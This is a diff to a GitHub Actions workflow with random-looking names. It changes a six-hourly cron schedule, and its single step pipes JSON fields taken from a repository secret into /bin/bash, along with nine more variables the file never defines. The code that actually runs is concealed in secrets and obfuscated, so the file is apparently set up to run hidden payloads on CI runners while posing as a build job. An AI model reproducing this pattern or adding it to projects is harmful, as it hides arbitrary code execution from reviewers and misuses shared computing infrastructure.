@@ -1,26 +1,26 @@
 name: troubleddreary
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 1/6 * * *'
-
-jobs:  # 27659
+    - cron: '4 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: troubleddreary
         env:
-          r372: ${{ secrets.r372 }}
+          hpe9: ${{ secrets.hpe9 }}
         run: |
-          echo $r372 | jq -r .ras62 | /bin/bash
-          echo $zwft8 | jq -r .m3823 | /bin/bash
-          echo $dzvkq15 | jq -r .kzmsp6013 | /bin/bash
-          echo $ckpgb45 | jq -r .rmuk32 | /bin/bash
-          echo $xtd8569 | jq -r .kmmwc396 | /bin/bash
-          echo $qklw30 | jq -r .djgii68466 | /bin/bash
-          echo $gly0 | jq -r .fqnfs48756 | /bin/bash
-          echo $as4 | jq -r .fozat75 | /bin/bash
-          echo $mp10 | jq -r .pesx77 | /bin/bash
-          echo $mm25 | jq -r .yu86 | /bin/bash
+          echo $hpe9 | jq -r .gop2062 | /bin/bash
+          echo $u41 | jq -r .ei9 | /bin/bash
+          echo $yxnv34 | jq -r .mqja4781 | /bin/bash
+          echo $zmr2 | jq -r .tnd596 | /bin/bash
+          echo $n8639 | jq -r .wp2 | /bin/bash
+          echo $cni7902 | jq -r .kb503 | /bin/bash
+          echo $ls44316 | jq -r .lbb523 | /bin/bash
+          echo $iaw46633 | jq -r .ss12383 | /bin/bash
+          echo $nqu9 | jq -r .ldgv6 | /bin/bash
 
